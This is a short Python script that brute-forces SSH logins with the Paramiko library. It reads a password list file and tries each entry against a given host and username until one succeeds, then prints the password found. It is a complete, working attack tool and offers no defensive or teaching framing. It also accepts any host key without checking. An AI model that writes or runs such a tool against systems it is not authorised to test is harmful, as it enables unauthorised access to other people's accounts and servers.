#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
A simple script to brute-force SSH passwords using Paramiko.
"""

import argparse
import paramiko

def brute_force_ssh(host: str, port: int, username: str, password: str) -> bool:
	"""Attempt to brute-force the SSH password for the specified host/user

	Args:
		host (str): The host to connect to
		port (int): The port to connect to
		username (str): The username to use
		password (str): The password to use
	Return:
		bool: True if the password is correct, False otherwise
	"""
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(host, port=port, username=username, password=password)
		return True
	except paramiko.AuthenticationException:
		return False
	finally:
		client.close()

def main():
	parser = argparse.ArgumentParser(description="A simple script to brute-force SSH passwords")
	parser.add_argument("host", type=str, help="The host to connect to")
	parser.add_argument("username", type=str, help="The username to use")
	parser.add_argument("passwords", type=argparse.FileType("r"), help="The file containing passwords")
	parser.add_argument("--port", "-p", type=int, default=22, help="The port to connect to")
	args = parser.parse_args()

	for password in args.passwords:
		password = password.strip()
		if brute_force_ssh(args.host, args.port, args.username, password):
			print(f"Password found: {password}")
			break
	else:
		print("Password not found")

if __name__ == "__main__":
	main()
